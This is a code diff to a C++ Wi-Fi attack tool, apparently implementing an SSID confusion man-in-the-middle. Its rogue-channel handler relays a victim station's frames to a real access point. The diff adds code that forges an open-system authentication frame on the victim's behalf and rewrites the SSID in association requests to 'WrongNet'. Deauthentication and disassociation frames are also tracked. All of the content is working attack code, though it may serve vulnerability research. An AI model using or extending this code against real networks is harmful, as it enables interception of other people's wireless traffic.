@@ -78,6 +78,15 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot1
 	display_traffic(dot11, "Rogue channel", " -- MitMing (relay to real)");
 	client_state.update_state(ClientState::Associated);
 
+	// SME-mode clients (NL80211_CMD_CONNECT) skip explicit auth; inject synthetic open
+	// auth to real AP so it has authenticated state before the assoc arrives.
+	Dot11Authentication synth_auth(HWAddress<6>(ap.get(SK::mac)), HWAddress<6>(sta.get(SK::mac)));
+	synth_auth.addr3(HWAddress<6>(ap.get(SK::mac)));
+	synth_auth.auth_algorithm(0);
+	synth_auth.auth_seq_number(1);
+	synth_auth.status_code(0);
+	send_to_real(synth_auth);
+
 	auto translated = ensure_radiotap(raw);
 	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
 	send_to_real(translated);
@@ -102,19 +111,15 @@ void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const 
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
 
 	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
-	if(handle_open_auth(addr2, *dot11)) {
-		// also forward to real AP — real AP needs auth before it will accept assoc
-		if(addr2 == HWAddress<6>(sta.get(SK::mac)))
-			send_to_real(ensure_radiotap(raw));
-		return;
-	}
+	if(handle_open_auth(addr2, *dot11)) return;
 	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
 	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr2, *pdu, raw))
 
 #undef SOLVE_OR_CONTINUE
 
 	if(addr2 == sta.get(SK::mac)) {
-		// This is traffic involving the real AP
+		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
+			client_state.update_state(ClientState::Target_disconnected);
 		display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
 		send_to_real(raw);
 	}
